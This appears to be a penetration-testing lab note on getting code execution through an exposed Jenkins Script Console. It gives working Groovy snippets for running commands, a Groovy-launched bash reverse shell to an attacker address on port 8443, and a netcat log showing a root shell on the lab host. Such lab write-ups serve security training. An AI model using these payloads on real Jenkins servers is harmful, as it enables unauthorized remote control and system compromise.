## Script Console

Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the `id` command.

```groovy
def cmd = 'id' 
def sout = new StringBuffer(), serr = new StringBuffer() 
def proc = cmd.execute() 
proc.consumeProcessOutput(sout, serr) 
proc.waitForOrKill(1000) 
println sout
```

```url
http://jenkins.inlanefreight.local:8000/script
```
![](Pasted%20image%2020260730124428.png)

```groovy
r = Runtime.getRuntime() 
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) 
p.waitFor()
```

Running the above commands results in a reverse shell connection.

```shell
3kjS@htb[/htb]$ nc -lvnp 8443 

listening on [any] 8443 ... 
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844 

id 

uid=0(root) gid=0(root) groups=0(root) 

/bin/bash -i 

root@app02:/var/lib/jenkins3#
```

```groovy
def cmd = "cmd.exe /c dir".execute(); 
println("${cmd.text}");
```
